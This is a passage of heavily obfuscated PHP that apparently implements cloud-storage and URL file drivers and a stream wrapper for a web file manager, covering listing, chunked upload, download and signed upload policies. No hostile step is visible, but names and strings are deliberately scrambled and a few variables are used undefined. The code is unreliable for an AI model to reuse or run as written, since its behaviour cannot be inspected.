$ˆ·Ö»»Ó[89] => isset($µ”İá–å[$ˆ·Ö»»Ó[89]]) ? $µ”İá–å[$ˆ·Ö»»Ó[89]] : 0, $ˆ·Ö»»Ó[176] => $this->ext($‹‹ï±•)); if ($üí˜°·£) { return $ÙîÛ„©; } $ÙîÛ„©[$ˆ·Ö»»Ó[241]] = $ÙîÛ„©[$ˆ·Ö»»Ó[98]] = 0; $ÙîÛ„©[$ˆ·Ö»»Ó[242]] = $ÙîÛ„©[$ˆ·Ö»»Ó[243]] = !0; if (empty($µ”İá–å)) { $µ”İá–å = $this->objectMeta($‹‹ï±•); if (!$µ”İá–å) { return $ÙîÛ„©; } } $ÙîÛ„©[$ˆ·Ö»»Ó[241]] = intval($µ”İá–å[$ˆ·Ö»»Ó[1769]]); $ÙîÛ„©[$ˆ·Ö»»Ó[98]] = intval($µ”İá–å[$ˆ·Ö»»Ó[1770]]); $ÙîÛ„©[$ˆ·Ö»»Ó[89]] = $µ”İá–å[$ˆ·Ö»»Ó[89]]; return $ÙîÛ„©; } public function folderInfo($‘«î…ù², $ïĞ°‰«¢ = false) { $‰ ‡ê¨Ë =& $_SERVER[øşô´çË]; $¯ »„à = array($‰ ‡ê¨Ë[42] => $this->pathThis($‘«î…ù²), $‰ ‡ê¨Ë[97] => $this->getPathOuter($‰ ‡ê¨Ë[8] . $‘«î…ù²), $‰ ‡ê¨Ë[43] => $‰ ‡ê¨Ë[88]); if ($ïĞ°‰«¢) { return $¯ »„à; } $¯ »„à[$‰ ‡ê¨Ë[241]] = $¯ »„à[$‰ ‡ê¨Ë[98]] = 0; $¯ »„à[$‰ ‡ê¨Ë[242]] = $¯ »„à[$‰ ‡ê¨Ë[243]] = !0; if (empty($ıÕ€ÇŞ˜)) { $ıÕ€ÇŞ˜ = $this->objectMeta($‘«î…ù²); if (!$ıÕ€ÇŞ˜) { return $¯ »„à; } } $¯ »„à[$‰ ‡ê¨Ë[241]] = intval($ıÕ€ÇŞ˜[$‰ ‡ê¨Ë[1769]]); $¯ »„à[$‰ ‡ê¨Ë[98]] = intval($ıÕ€ÇŞ˜[$‰ ‡ê¨Ë[1770]]); return $¯ »„à; } private function listObjs($‚ŠÂ£Ş«, $ï‰ØİŞ¸ = 0, $€È‰í’š = 1000) { $ˆÒò‹Ô“ =& $_SERVER[øşô´çË]; $ÂÒ°²šÉ = array($ˆÒò‹Ô“[1771], $ˆÒò‹Ô“[1772] . $€È‰í’š); if ($ï‰ØİŞ¸) { $ÂÒ°²šÉ[] = $ˆÒò‹Ô“[1773] . $ï‰ØİŞ¸; } $’ÕÎş¶¾ = $this->ussRequest($‚ŠÂ£Ş«, $ˆÒò‹Ô“[1601], !1, $ÂÒ°²šÉ); return !$’ÕÎş¶¾[$ˆÒò‹Ô“[1398]] ? !1 : $’ÕÎş¶¾[$ˆÒò‹Ô“[1388]]; } private function fileList($™¹×¶®È, &$»ºƒ†â™, &$Ë¡Ğì•ô, $ÛƒëóûÒ = false) { $¿·‹¢Ğ =& $_SERVER[øşô´çË]; $šåÅÛ¡ = $¿·‹¢Ğ[12]; $£å¬ˆ¡» = 1000; $µ€ğâ÷Ä = rtrim($™¹×¶®È, $¿·‹¢Ğ[8]) . $¿·‹¢Ğ[8]; while (!0) { check_abort(); $¼‰ÊôŞ” = $this->listObjs($™¹×¶®È, $šåÅÛ¡, $£å¬ˆ¡»); if (!$¼‰ÊôŞ”) { return !1; } $šåÅÛ¡ = isset($¼‰ÊôŞ”[$¿·‹¢Ğ[1774]]) ? $¼‰ÊôŞ”[$¿·‹¢Ğ[1774]] : $¿·‹¢Ğ[12]; $‘ÎÊ•›’ = isset($¼‰ÊôŞ”[$¿·‹¢Ğ[1775]]) ? $¼‰ÊôŞ”[$¿·‹¢Ğ[1775]] : array(); foreach ($‘ÎÊ•›’ as $´ÚƒÙ¿†) { $ƒÍ•Ú = $´ÚƒÙ¿†[$¿·‹¢Ğ[43]] == $¿·‹¢Ğ[88] ? !0 : !1; $ú¸Ç—í = ltrim($µ€ğâ÷Ä . $´ÚƒÙ¿†[$¿·‹¢Ğ[42]], $¿·‹¢Ğ[8]) . ($ƒÍ•Ú ? $¿·‹¢Ğ[8] : $¿·‹¢Ğ[12]); $–»€ïé = array($¿·‹¢Ğ[42] => $ú¸Ç—í, $¿·‹¢Ğ[43] => $ƒÍ•Ú ? $¿·‹¢Ğ[88] : $¿·‹¢Ğ[240], $¿·‹¢Ğ[89] => $´ÚƒÙ¿†[$¿·‹¢Ğ[421]], $¿·‹¢Ğ[1770] => $´ÚƒÙ¿†[$¿·‹¢Ğ[1776]]); $this->cacheMethodInfoSet($ú¸Ç—í, $ƒÍ•Ú, $–»€ïé); if ($ƒÍ•Ú) { $»ºƒ†â™[] = $ú¸Ç—í; if ($ÛƒëóûÒ) { $this->fileList($ú¸Ç—í, $»ºƒ†â™, $Ë¡Ğì•ô, $ÛƒëóûÒ); } continue; } $Ë¡Ğì•ô[] = $–»€ïé; } if (count($‘ÎÊ•›’) < $£å¬ˆ¡») { break; } } $this->cacheMethodInfoSet($™¹×¶®È, !0); } public function listPath($õÃôèşÌ, $æ¶şŸšõ = false) { $ªçâ¼‰ó =& $_SERVER[øşô´çË]; $¿™š ± = $–Û—‹¯ = array(); $this->fileList($õÃôèşÌ, $¿™š ±, $–Û—‹¯); foreach ($¿™š ± as $òÉ°ç–Ğ => $áÄŞÙÕ) { $¿™š ±[$òÉ°ç–Ğ] = $this->folderInfo($áÄŞÙÕ, $æ¶şŸšõ); } foreach ($–Û—‹¯ as $òÉ°ç–Ğ => $áÄŞÙÕ) { $–Û—‹¯[$òÉ°ç–Ğ] = $this->fileInfo($áÄŞÙÕ[$ªçâ¼‰ó[42]], $æ¶şŸšõ, $áÄŞÙÕ); } return array($ªçâ¼‰ó[95] => $¿™š ±, $ªçâ¼‰ó[96] => $–Û—‹¯); } public function has($‚ø¯¢ê, $¡«Àú‹ = false, $ÃûÄ‹×Ò = true) { $Ò™Á§ğß =& $_SERVER[øşô´çË]; $ÄÚà®ùÕ = $Ò™Á§ğß[12]; $Ò¬ô€Šı = 500; $Ğ«ªã«€ = 0; $¥èÒ•ˆ = 0; $İ…ã¹ = rtrim($‚ø¯¢ê, $Ò™Á§ğß[8]) . $Ò™Á§ğß[8]; while (!0) { check_abort(); $ÔÈõÁù = $this->listObjs($‚ø¯¢ê, $ÄÚà®ùÕ, $Ò¬ô€Šı); if (!$ÔÈõÁù) { return !1; } $ÄÚà®ùÕ = isset($ÔÈõÁù[$Ò™Á§ğß[1774]]) ? $ÔÈõÁù[$Ò™Á§ğß[1774]] : $Ò™Á§ğß[12]; $Û¿×ÀÑñ = isset($ÔÈõÁù[$Ò™Á§ğß[1775]]) ? $ÔÈõÁù[$Ò™Á§ğß[1775]] : array(); if (empty($Û¿×ÀÑñ)) { break; } $Ÿ¼áÓ€ = array_filter($Û¿×ÀÑñ, function ($•ãåÙ§ª) { $Õ¶šñáÁ =& $_SERVER[øşô´çË]; return $•ãåÙ§ª[$Õ¶šñáÁ[43]] == $Õ¶šñáÁ[88]; }); $Îú¶¢¨ó = count($Û¿×ÀÑñ); $Ÿ¼áÓ€ = count($Ÿ¼áÓ€); $ß€à—· = $Îú¶¢¨ó - $Ÿ¼áÓ€; if ($¡«Àú‹) { $¥èÒ•ˆ += $Ÿ¼áÓ€; $Ğ«ªã«€ += $ß€à—·; if ($Îú¶¢¨ó < $Ò¬ô€Šı) { break; } continue; } if ($ÃûÄ‹×Ò) { if ($ß€à—·) { return !0; } } else { if ($Ÿ¼áÓ€) { return !0; } } if ($Îú¶¢¨ó < $Ò¬ô€Šı) { break; } } if ($¡«Àú‹) { return array($Ò™Á§ğß[249] => $Ğ«ªã«€, $Ò™Á§ğß[250] => $¥èÒ•ˆ); } return !1; } public function listAll($ôöÕç) { $ı»Åù‘ =& $_SERVER[øşô´çË]; $ƒğ€Ø“ç = $ÚÌ®Ò = array(); $this->fileList($ôöÕç, $ƒğ€Ø“ç, $ÚÌ®Ò, !0); $À¹íÂ¬˜ = array_to_keyvalue($ÚÌ®Ò, $ı»Åù‘[42]); foreach ($ƒğ€Ø“ç as $ìµüÌ«›) { if (is_string($ìµüÌ«›)) { $À¹íÂ¬˜[$ìµüÌ«›] = array($ı»Åù‘[89] => 0); } } return $this->listAllFiles($ôöÕç, $À¹íÂ¬˜); } public function canRead($ãÄŞÈÍã) { return $this->exist($ãÄŞÈÍã) ? !0 : !1; } public function canWrite($“ÖİùÄ) { return $this->exist($“ÖİùÄ) ? !0 : !1; } public function getContent($‰‘—ûÁ‘) { return $this->fileSubstr($‰‘—ûÁ‘, 0, -1); } public function setContent($ß¦Ñ®­„, $Êåê­Õ = '') { $é“èó„œ =& $_SERVER[øşô´çË]; if (!$Êåê­Õ) { $å›Ø†‡ = $this->ussRequest($ß¦Ñ®­„, $é“èó„œ[297]); return $å›Ø†‡[$é“èó„œ[1398]]; } $¶Äêİû“ = $this->tempFile($this->pathThis($ß¦Ñ®­„)); file_put_contents($¶Äêİû“, $Êåê­Õ); if ($this->upload($ß¦Ñ®­„, $¶Äêİû“)) { $this->tempFileRemve($¶Äêİû“); return !0; } return !1; } public function fileSubstr($«ò»µÈ—, $ŒãÉáè, $Ú£Ãå¢è) { $‘õ¤­À =& $_SERVER[øşô´çË]; if (!($×¶Şù‡À = $this->link($«ò»µÈ—))) { return !1; } $ûÇ„À»µ = !1; if ($Ú£Ãå¢è > 0) { $ƒæ¹‹‘¨ = $ŒãÉáè + $Ú£Ãå¢è - 1; $ûÇ„À»µ = array($‘õ¤­À[1600] . $ŒãÉáè . $‘õ¤­À[485] . $ƒæ¹‹‘¨); } $·úä¢’’ = url_request($×¶Şù‡À, $‘õ¤­À[1601], !1, $ûÇ„À»µ); return $·úä¢’’[$‘õ¤­À[852]] ? $·úä¢’’[$‘õ¤­À[1388]] : !1; } public function upload($Š½Ù¥ÙÑ, $Ñ£ßå£, $÷‹¶†­ = false, $ñºû‚ıá = REPEAT_REPLACE) { $Ø’¤¹êÑ =& $_SERVER[øşô´çË]; if (!$Ñ£ßå£ || !@file_exists($Ñ£ßå£)) { return !1; } $íüª´ Û = IO::size($Ñ£ßå£); if ($íüª´ Û <= 1024 * 1024 * 200) { $©ª•ã‡› = array($Ø’¤¹êÑ[1777] . $Ñ£ßå£); $‹å·äÁÇ = $this->ussRequest($Š½Ù¥ÙÑ, $Ø’¤¹êÑ[263], $©ª•ã‡›); return $‹å·äÁÇ[$Ø’¤¹êÑ[1398]] ? $this->getPathOuter($Š½Ù¥ÙÑ) : !1; } $šáÊ«ñ÷ = 1024 * 1024 * 10; $µ œÖµ = array($Ø’¤¹êÑ[1778], $Ø’¤¹êÑ[1779] . $íüª´ Û, $Ø’¤¹êÑ[1780], $Ø’¤¹êÑ[1781] . $šáÊ«ñ÷); $‹å·äÁÇ = $this->ussRequest($Š½Ù¥ÙÑ, $Ø’¤¹êÑ[263], !1, $µ œÖµ); if (!$‹å·äÁÇ[$Ø’¤¹êÑ[1398]]) { return !1; } $àÆ¸ûµ™ = $‹å·äÁÇ[$Ø’¤¹êÑ[1388]]; $¸¡ñŸ¢½ = 0; $©Àï’šÉ = $àÆ¸ûµ™[$Ø’¤¹êÑ[1782]]; $íèéÓà = fopen($Ñ£ßå£, $Ø’¤¹êÑ[1662]); if (!$íèéÓà) { return !1; } do { $à ÓúÒ = $àÆ¸ûµ™[$Ø’¤¹êÑ[1783]]; fseek_64($íèéÓà, $¸¡ñŸ¢½); $úöá–”‚ = fread($íèéÓà, $à ÓúÒ); $ª×ñ¯Ô = 0; do { $ª×ñ¯Ô++; $àÆ¸ûµ™ = $this->uploadPart($Š½Ù¥ÙÑ, $àÆ¸ûµ™, $úöá–”‚); } while (!$àÆ¸ûµ™ && $ª×ñ¯Ô < 3); if (!$àÆ¸ûµ™) { return !1; } $©Àï’šÉ = $àÆ¸ûµ™[$Ø’¤¹êÑ[1782]]; $¸¡ñŸ¢½ += $à ÓúÒ; } while ($©Àï’šÉ != -1); fclose($íèéÓà); $µ œÖµ = array($Ø’¤¹êÑ[1784], $Ø’¤¹êÑ[1785] . $àÆ¸ûµ™[$Ø’¤¹êÑ[1786]], $Ø’¤¹êÑ[1780]); $‹å·äÁÇ = $this->ussRequest($Š½Ù¥ÙÑ, $Ø’¤¹êÑ[263], !1, $µ œÖµ); return $‹å·äÁÇ[$Ø’¤¹êÑ[1398]] ? $this->getPathOuter($‰¶óì¤¨) : !1; } private function uploadPart($ûµ™°ÛÒ, $ÙûÛä €, &$‚è®çã) { $šÂÅóŸ® =& $_SERVER[øşô´çË]; $©ÎÑ…Ø³ = array($šÂÅóŸ®[1787], $šÂÅóŸ®[1785] . $ÙûÛä €[$šÂÅóŸ®[1786]], $šÂÅóŸ®[1788] . $ÙûÛä €[$šÂÅóŸ®[1782]], $šÂÅóŸ®[153] . $ÙûÛä €[$šÂÅóŸ®[1783]]); $‡ø›“ÀÊ = $this->ussRequest($ûµ™°ÛÒ, $šÂÅóŸ®[263], $‚è®çã, $©ÎÑ…Ø³); return !$‡ø›“ÀÊ[$šÂÅóŸ®[1398]] ? $‡ø›“ÀÊ[$šÂÅóŸ®[1398]] : $‡ø›“ÀÊ[$šÂÅóŸ®[1388]]; } public function uploadFormData($ãä§ÙÈ, $–ºˆí€ = 3600) { return $this->uploadPolicy($ãä§ÙÈ, $–ºˆí€); } public function uploadMultiData($ê£œˆÚ², $ôû·ğĞ = 3600) { $ªöáä¼ı =& $_SERVER[øşô´çË]; $Æ·È®„ø = (int) $GLOBALS[$ªöáä¼ı[7]][$ªöáä¼ı[89]]; return $this->uploadPolicy($ê£œˆÚ², $ôû·ğĞ, $Æ·È®„ø); } private function uploadPolicy($ª‘“ÉÁ, $æ¬ÒÚÅ¸ = 3600, $¥Íèï‚¯ = 0) { $æ“Éñò =& $_SERVER[øşô´çË]; $éº°ˆÖ¸ = $æ“Éñò[8] . $this->bucket; $ğöê°ãÇ = gmdate($æ“Éñò[1697]); $Ÿ¾÷‡ş = array($æ“Éñò[1789] => $this->bucket, $æ“Éñò[1790] => $ª‘“ÉÁ, $æ“Éñò[1791] => time() + $æ¬ÒÚÅ¸, $æ“Éñò[1792] => $ğöê°ãÇ); if ($¥Íèï‚¯) { $Ÿ¾÷‡ş[$æ“Éñò[1682]] = $¥Íèï‚¯; } $ÚçĞ»ÄŒ = base64_encode(json_encode($Ÿ¾÷‡ş)); $äª“ ‰ = base64_encode(hash_hmac($æ“Éñò[1746], "\120\x4f\123\x54\x26{$éº°ˆÖ¸}\x26{$ğöê°ãÇ}\46{$ÚçĞ»ÄŒ}", md5("{$this->userpass}"), !0)); $¼¬‡ìÛ = array($æ“Éñò[287] => $ÚçĞ»ÄŒ, $æ“Éñò[1793] => "\125\x50\x59\x55\x4e\40{$this->username}\x3a{$äª“ ‰}", $æ“Éñò[216] => $this->endpoint . $éº°ˆÖ¸); return $¼¬‡ìÛ; } public function download($õ¼Á™Ì, $®”¤ó¹†) { $µÈúá‚ = IO::getPathInner(IO::mkfile($®”¤ó¹†)); if (!($š³ãşœï = $this->link($õ¼Á™Ì))) { return !1; } $Şò³œ› = 0; $©¡è‚öŸ = 1024 * 200; $Ê’Ä²— = fopen($µÈúá‚, $_SERVER[øşô´çË][1741]); while (!0) { $ÎÒ‘¾®ô = $this->fileSubstr($õ¼Á™Ì, $Şò³œ›, $©¡è‚öŸ); if ($ÎÒ‘¾®ô === !1) { return !1; } fwrite($Ê’Ä²—, $ÎÒ‘¾®ô); $Şò³œ› += $©¡è‚öŸ; if (strlen($ÎÒ‘¾®ô) < $©¡è‚öŸ) { break; } } fclose($Ê’Ä²—); return $®”¤ó¹†; } public function link($†›€øÂ», $Ûı…ğûÛ = array()) { $šœÊ¡ìğ =& $_SERVER[øşô´çË]; $†›€øÂ» = trim($†›€øÂ», $šœÊ¡ìğ[8]); if (!empty($this->token)) { $Ø–Óßô÷ = strtotime(date($šœÊ¡ìğ[1794])); $Ê˜Í ”Ó = substr(md5($this->token . $šœÊ¡ìğ[294] . $Ø–Óßô÷ . $šœÊ¡ìğ[1795] . $†›€øÂ»), 12, 8) . $Ø–Óßô÷; $Ûı…ğûÛ[] = $šœÊ¡ìğ[1796] . $Ê˜Í ”Ó; } $õÎŒ‚åá = !empty($Ûı…ğûÛ) ? $šœÊ¡ìğ[86] . implode($šœÊ¡ìğ[294], $Ûı…ğûÛ) : $šœÊ¡ìğ[12]; return $this->getHost() . $šœÊ¡ìğ[8] . $this->pathEncode($†›€øÂ») . $õÎŒ‚åá; } public function fileOut($ºÆáòƒ¼, $¾Å’Ìá« = false, $‰†ï§•° = false, $ôé¢——÷ = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($ºÆáòƒ¼, $¾Å’Ìá«, $‰†ï§•°, $ôé¢——÷); } if (!$‰†ï§•°) { $‰†ï§•° = $this->pathThis($ºÆáòƒ¼); } $ÏÙ‘Øå£ = $¾Å’Ìá« ? array($_SERVER[øşô´çË][1797] . rawurlencode($‰†ï§•°)) : array(); $™¿•°ï´ = $this->link($ºÆáòƒ¼, $ÏÙ‘Øå£); $this->fileOutLink($™¿•°ï´); } public function fileOutServer($Áó×…ÍË, $“ì±ö = false, $Òİ¡¡â = false, $È¾Ş…ü¼ = '') { parent::fileOut($Áó×…ÍË, $“ì±ö, $Òİ¡¡â, $È¾Ş…ü¼); } public function fileOutImage($ˆğ¤ÏÑ, $…Â¼¨Í› = 250) { $­½ä¥ü½ = $this->link($ˆğ¤ÏÑ . $_SERVER[øşô´çË][1798] . $…Â¼¨Í›); $this->fileOutLink($­½ä¥ü½); } public function fileOutImageServer($§ƒÆÂÓ­, $±µ¤   = 250) { parent::fileOutImage($§ƒÆÂÓ­, $±µ¤  ); } public function hashMd5($ùïñ»Âå) { $ì×ÜÓ¾ =& $_SERVER[øşô´çË]; $«ŒÓæÏã = $this->_objectMeta($ùïñ»Âå); return isset($«ŒÓæÏã[$ì×ÜÓ¾[255]]) ? $«ŒÓæÏã[$ì×ÜÓ¾[255]] : !1; } public function size($± Óòˆ©) { $äç€µ·É = $this->objectMeta($± Óòˆ©); return $äç€µ·É ? $äç€µ·É[$_SERVER[øşô´çË][89]] : 0; } public function info($Ç‡ù¶Ÿ¦) { if ($this->isFolder($Ç‡ù¶Ÿ¦)) { return $this->folderInfo($Ç‡ù¶Ÿ¦); } else { if ($this->isFile($Ç‡ù¶Ÿ¦)) { return $this->fileInfo($Ç‡ù¶Ÿ¦); } } return !1; } public function exist($»Â™€“Š) { return $this->isFile($»Â™€“Š) || $this->isFolder($»Â™€“Š); } public function isFile($¡ÖÉ²ì¡) { return !$this->isFolder($¡ÖÉ²ì¡) && $this->objectMeta($¡ÖÉ²ì¡); } public function isFolder($¡ÙŠèª) { return $this->cacheMethod($_SERVER[øşô´çË][187], $¡ÙŠèª); } protected function objectMeta($’“§ÄÀÅ) { return $this->cacheMethod($_SERVER[øşô´çË][189], $’“§ÄÀÅ); } protected function _objectMeta($Œ¼ü˜Ñ³) { $Ö‚¸¯ÊÑ =& $_SERVER[øşô´çË]; if ($Œ¼ü˜Ñ³ == $Ö‚¸¯ÊÑ[12] || $Œ¼ü˜Ñ³ == $Ö‚¸¯ÊÑ[8]) { return array(); } $áô÷µù£ = $this->ussRequest($Œ¼ü˜Ñ³, $Ö‚¸¯ÊÑ[1799]); if (!$áô÷µù£[$Ö‚¸¯ÊÑ[1398]]) { return null; } $İüÎç‹ = isset($áô÷µù£[$Ö‚¸¯ÊÑ[1388]]) ? $áô÷µù£[$Ö‚¸¯ÊÑ[1388]] : array(); if (!isset($İüÎç‹[$Ö‚¸¯ÊÑ[1800]])) { return null; } $÷ä«ƒ›“ = array($Ö‚¸¯ÊÑ[43] => isset($İüÎç‹[$Ö‚¸¯ÊÑ[1800]]) ? $İüÎç‹[$Ö‚¸¯ÊÑ[1800]] : null, $Ö‚¸¯ÊÑ[89] => isset($İüÎç‹[$Ö‚¸¯ÊÑ[1801]]) ? $İüÎç‹[$Ö‚¸¯ÊÑ[1801]] : null, $Ö‚¸¯ÊÑ[255] => isset($İüÎç‹[$Ö‚¸¯ÊÑ[1802]]) ? $İüÎç‹[$Ö‚¸¯ÊÑ[1802]] : null, $Ö‚¸¯ÊÑ[1769] => isset($İüÎç‹[$Ö‚¸¯ÊÑ[1803]]) ? $İüÎç‹[$Ö‚¸¯ÊÑ[1803]] : null); $÷ä«ƒ›“[$Ö‚¸¯ÊÑ[1770]] = isset($İüÎç‹[$Ö‚¸¯ÊÑ[1804]]) ? strtotime($İüÎç‹[$Ö‚¸¯ÊÑ[1804]]) : $÷ä«ƒ›“[$Ö‚¸¯ÊÑ[1769]]; return $÷ä«ƒ›“; } protected function _isFolder($•úæÀ±) { $‚òŠ²Ó =& $_SERVER[øşô´çË]; if ($•úæÀ± == $‚òŠ²Ó[12] || $•úæÀ± == $‚òŠ²Ó[8]) { return !0; } $Â“ÛÉñ» = $this->_objectMeta($•úæÀ±); return isset($Â“ÛÉñ»[$‚òŠ²Ó[43]]) && $Â“ÛÉñ»[$‚òŠ²Ó[43]] == $‚òŠ²Ó[88] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($Ú¥ÖŸ€ = false) { } public function exist($ğêÓò‚ì) { $ãïÅ€§Ï = $this->info($ğêÓò‚ì); return $ãïÅ€§Ï[$_SERVER[øşô´çË][242]]; } public function isFile($œ¤Ä—ëú) { $¾şÈŒ = $this->info($œ¤Ä—ëú); return $¾şÈŒ[$_SERVER[øşô´çË][242]]; } public function isFolder($œì´î”£) { return !1; } public function size($äñ•‚¢Å) { $ù…óÌĞ = $this->info($äñ•‚¢Å); return $ù…óÌĞ[$_SERVER[øşô´çË][89]]; } public function info($¥üó½ß”) { return $this->infoParse($¥üó½ß”); } public function infoAuth($¾õêù§Ø) { return $this->infoParse($¾õêù§Ø); } public function infoWithChildren($Ó³ìê‰İ) { return $this->infoParse($Ó³ìê‰İ); } public function infoFull($‚´Ğ¶¯…) { return $this->infoParse($‚´Ğ¶¯…); } private function infoParse($›ò­§Â·) { $Í¾°˜®ï =& $_SERVER[øşô´çË]; $ó³â£€± = $this->header($›ò­§Â·); if (!$ó³â£€± || !$ó³â£€±[$Í¾°˜®ï[852]]) { return !1; } $âñè„ú = _get($ó³â£€±, $Í¾°˜®ï[421], 0); $¹•„›î = array($Í¾°˜®ï[42] => $ó³â£€±[$Í¾°˜®ï[42]], $Í¾°˜®ï[97] => $›ò­§Â·, $Í¾°˜®ï[43] => $Í¾°˜®ï[240], $Í¾°˜®ï[89] => intval($âñè„ú), $Í¾°˜®ï[176] => get_path_ext($ó³â£€±[$Í¾°˜®ï[42]]), $Í¾°˜®ï[1659] => $âñè„ú > 0 && $ó³â£€±[$Í¾°˜®ï[1805]], $Í¾°˜®ï[1660] => !1); return $¹•„›î; } private function header($ëÏ—ª’Ã) { $Å‘ßß ‡ =& $_SERVER[øşô´çË]; if (isset(self::$_cacheHeader[$ëÏ—ª’Ã])) { return self::$_cacheHeader[$ëÏ—ª’Ã]; } $Ê¦º®É = isset($GLOBALS[$Å‘ßß ‡[1806]]) ? $GLOBALS[$Å‘ßß ‡[1806]] : !1; $GLOBALS[$Å‘ßß ‡[1806]] = !0; self::$_cacheHeader[$ëÏ—ª’Ã] = url_header($ëÏ—ª’Ã); $GLOBALS[$Å‘ßß ‡[1806]] = $Ê¦º®É; return self::$_cacheHeader[$ëÏ—ª’Ã]; } public function hashSimple($Ò‹ôª©«, $ùû”›­ = false) { $Ú—‚‡ï =& $_SERVER[øşô´çË]; $æêô¨ÙÌ = $this->info($Ò‹ôª©«); if (!$æêô¨ÙÌ || !$æêô¨ÙÌ[$Ú—‚‡ï[242]]) { return !1; } $Ì·âùŞ = $æêô¨ÙÌ[$Ú—‚‡ï[89]]; $Â„è›õ’ = 200; $ŞÄÚÔú = 50; if ($Ì·âùŞ <= $Â„è›õ’ * $ŞÄÚÔú) { return md5($this->fileSubstr($Ò‹ôª©«, 0, $Ì·âùŞ)) . $Ì·âùŞ; } $ÂªÕúÎ = intval($Ì·âùŞ / $ŞÄÚÔú); $æğ‘óï¶ = $Ú—‚‡ï[12]; $ıëÉõ›Ï = timeFloat(); $ô£ ›Í = 15; for ($›ïô½ò• = 0; $›ïô½ò• < $ŞÄÚÔú; $›ïô½ò•++) { if (timeFloat() - $ıëÉõ›Ï > $ô£ ›Í) { return !1; } $×Ú‰¼Ø = $this->fileSubstr($Ò‹ôª©«, $ÂªÕúÎ * $›ïô½ò•, $Â„è›õ’); if (!$×Ú‰¼Ø) { return !1; } $æğ‘óï¶ .= $×Ú‰¼Ø; } $æğ‘óï¶ .= $this->fileSubstr($Ò‹ôª©«, $Ì·âùŞ - $Â„è›õ’, $Â„è›õ’); return md5($æğ‘óï¶) . $Ì·âùŞ; } public function getContent($ë”÷Íú‘) { return $this->fileSubstr($ë”÷Íú‘); } public function fileSubstr($Ëç¢¥Ëû, $°îÃ¯Úí = 0, $¯ËÈ¾å¹ = -1) { $İÚÌ‹· =& $_SERVER[øşô´çË]; $¤¯´øÓ½ = $this->info($Ëç¢¥Ëû); if (!$¤¯´øÓ½ || !$¤¯´øÓ½[$İÚÌ‹·[242]] && $¤¯´øÓ½[$İÚÌ‹·[89]] > 1024 * 1024 * 10) { return !1; } if ($¯ËÈ¾å¹ === -1) { $¯ËÈ¾å¹ = $¤¯´øÓ½[$İÚÌ‹·[89]]; } if ($¯ËÈ¾å¹ == 0) { return $İÚÌ‹·[12]; } $Ç±ÖÙûõ = array($İÚÌ‹·[1807] . $°îÃ¯Úí . $İÚÌ‹·[890] . ($°îÃ¯Úí + $¯ËÈ¾å¹ - 1)); $«ÍãˆÈŞ = url_request($Ëç¢¥Ëû, $İÚÌ‹·[1601], !1, $Ç±ÖÙûõ, !1, !1, 30); return $«ÍãˆÈŞ[$İÚÌ‹·[1388]] ? $«ÍãˆÈŞ[$İÚÌ‹·[1388]] : $İÚÌ‹·[12]; } public function download($¾Ù¬‰Š, $ıó¿ôˆ) { Downloader::start($¾Ù¬‰Š, $ıó¿ôˆ); return $ıó¿ôˆ; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($ùú³Æ«ƒ, $Éäæø = '') { $this->info = $this->info($ùú³Æ«ƒ); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[øşô´çË][97]]; $this->pathOpen = $ùú³Æ«ƒ; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$ùú³Æ«ƒ])) { self::$_chunkBuffer[$ùú³Æ«ƒ] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($ø¡¾ı—) { $›‘·àı“ = $this->fileSubstr($this->pose, $ø¡¾ı—); $this->pose += strlen($›‘·àı“); return $›‘·àı“; } public function stream_tell() { return $this->pose; } public function stream_seek($‡¢÷ğÎ«, $ØòÜÍ¦‡) { $È¨¸³²è =& $_SERVER[øşô´çË]; if ($ØòÜÍ¦‡ == SEEK_SET) { $this->pose = $‡¢÷ğÎ«; } else { if ($ØòÜÍ¦‡ == SEEK_CUR) { $this->pose += $‡¢÷ğÎ«; } else { if ($ØòÜÍ¦‡ == SEEK_END) { $this->pose = $this->info[$È¨¸³²è[89]] + intval($‡¢÷ğÎ«); } } } if ($‡¢÷ğÎ« < 0) { $this->pose = $this->info[$È¨¸³²è[89]] + $‡¢÷ğÎ«; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[øşô´çË][89]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($¦¢Ô§ÕÃ, $ùºèÀŒû) { $ÎôÙª€¢ =& $_SERVER[øşô´çË]; $€†áöàÙ = $this->info($¦¢Ô§ÕÃ); return array($ÎôÙª€¢[1508] => 0, $ÎôÙª€¢[1808] => 0, $ÎôÙª€¢[26] => 32768 + 511, $ÎôÙª€¢[1809] => 0, $ÎôÙª€¢[1810] => 0, $ÎôÙª€¢[1811] => 0, $ÎôÙª€¢[1812] => 0, $ÎôÙª€¢[89] => $€†áöàÙ[$ÎôÙª€¢[89]], $ÎôÙª€¢[1813] => $€†áöàÙ[$ÎôÙª€¢[1658]], $ÎôÙª€¢[1770] => $€†áöàÙ[$ÎôÙª€¢[98]], $ÎôÙª€¢[1769] => $€†áöàÙ[$ÎôÙª€¢[241]], $ÎôÙª€¢[1814] => 0, $ÎôÙª€¢[1815] => 0); } static $fileInfo = array(); public function info($ÑÔç¥È) { $“Å³¢Œ¬ = $_SERVER[øşô´çË][1816]; if (isset(self::$fileInfo[$ÑÔç¥È])) { return self::$fileInfo[$ÑÔç¥È]; } if (substr($ÑÔç¥È, 0, strlen($“Å³¢Œ¬)) != $“Å³¢Œ¬) { return !1; } self::$fileInfo[$ÑÔç¥È] = IO::info(substr($ÑÔç¥È, strlen($“Å³¢Œ¬))); return self::$fileInfo[$ÑÔç¥È]; } public static function read($¨¬”–÷, $„“‹ß™à, $¨Ş¤ì„È) { if (!isset(self::$_fopenCache[$¨¬”–÷])) { $»”¤õ¼ = new StreamWrapperIO(); $»”¤õ¼->stream_open($¨¬”–÷); self::$_fopenCache[$¨¬”–÷] = $»”¤õ¼; } $»”¤õ¼ = self::$_fopenCache[$¨¬”–÷]; return $»”¤õ¼->fileSubstr($„“‹ß™à, $¨Ş¤ì„È); } public static function _read($º¸ñöé, $å’Çˆ‡ä, $§ùØ™ì) { $ä“›€Á½ =& $_SERVER[øşô´çË]; $¯ÛÑ†Ï = 